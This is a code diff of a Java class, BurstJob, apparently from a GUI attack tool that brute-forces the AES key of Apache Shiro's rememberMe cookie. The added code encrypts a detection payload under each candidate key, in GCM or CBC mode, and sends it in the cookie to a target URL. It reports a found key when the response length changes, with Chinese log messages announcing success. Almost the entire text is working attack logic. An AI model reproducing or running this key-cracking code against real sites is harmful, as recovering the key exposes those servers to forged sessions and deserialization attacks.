@@ -2,6 +2,8 @@ package cn.safe6.core;
 
 import cn.safe6.Controller;
 import cn.safe6.util.HttpClientUtil;
+import cn.safe6.util.PayloadEncryptTool;
+import cn.safe6.util.ShiroTool;
 import org.apache.commons.collections.CollectionUtils;
 import org.apache.commons.lang3.*;
 import javafx.application.Platform;
@@ -20,13 +22,13 @@ import java.util.concurrent.Callable;
 public class BurstJob implements Callable<String> {
     private String url;
     private String method;
-    private Map<String,String> params;
+    private Map<String,Object> params;
     private List<String> keys;
     final private Controller controller = (Controller) ControllersFactory.controllers.get(Controller.class.getSimpleName());
     final private Map<String,Object> paramsContext = ControllersFactory.paramsContext;
 
 
-    public BurstJob(String url, String method, Map<String,String> params, List<String> keys) {
+    public BurstJob(String url, String method, Map<String,Object> params, List<String> keys) {
         this.url = url;
         this.method = method;
         this.params = params;
@@ -45,23 +47,46 @@ public class BurstJob implements Callable<String> {
                 header = new HashMap<>();
             }
             //在原有cookie后面追加
-            header.put("cookie",header.get("cookie")+";"+paramsContext.get("rmeValue")+"=123456");
-            int errLen= HttpClientUtil.httpGetRequest(url,header).length();
-            for (String key : keys) {
-                Controller.logUtil.printInfoLog("检测"+key);
-                if(paramsContext.get("method").equals(Constants.METHOD_GET)){
-                    header.put("cookie",header.get("cookie")+";"+paramsContext.get("rmeValue")+"=");
-                    String data = HttpClientUtil.httpGetRequest(url,header);
-                   // if (errLen==data.length())
-
-
-
+            if (header.get("cookie")!=null){
+                if (!header.get("cookie").toString().contains(paramsContext.get("rmeValue").toString())){
+                    header.put("cookie",header.get("cookie")+";"+paramsContext.get("rmeValue")+"=123456");
                 }
+            }else {
+                header.put("cookie",paramsContext.get("rmeValue")+"=123456");
+            }
+            int errLen= HttpClientUtil.httpGetRequest(url,header).length();
+            int i=1;
+            for (String key : keys) {
+                Controller.logUtil.printInfoLog(i+".检测"+key);
+                String encryptData="";
+                if (paramsContext.get("AES").equals(Constants.AES_GCM)){
+                    encryptData = PayloadEncryptTool.AesGcmEncrypt(ShiroTool.getDetectText(),key);
+                }else {
+                    encryptData = PayloadEncryptTool.AesCbcEncrypt(ShiroTool.getDetectText(),key);
+                }
+
+                header.put("cookie",header.get("cookie")+";"+paramsContext.get("rmeValue")+"="+encryptData);
+                String data="";
+                if(paramsContext.get("method").equals(Constants.METHOD_GET)){
+                    data = HttpClientUtil.httpGetRequest(url,header);
+                }else {
+                    data = HttpClientUtil.httpPostRequest(url,header,params);
+                }
+
+                if (errLen!=data.length()){
+                    Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
+                    controller.aesKey.setText(key);
+                    break;
+                }else {
+                    Controller.logUtil.printAbortedLog("秘钥错误");
+                }
+
+                i++;
             }
         }catch (Exception e){
             e.printStackTrace();
         }finally {
-            Controller.logUtil.getLog().selectPositionCaret(controller.log.getText().length());
+            //Controller.logUtil.getLog().selectPositionCaret(controller.log.getText().length());
             Platform.runLater(() -> {
                 controller.burstKey.setDisable(false);
             });
@@ -87,11 +112,11 @@ public class BurstJob implements Callable<String> {
         this.method = method;
     }
 
-    public Map<String, String> getParams() {
+    public Map<String, Object> getParams() {
         return params;
     }
 
-    public void setParams(Map<String, String> params) {
+    public void setParams(Map<String, Object> params) {
         this.params = params;
     }
 
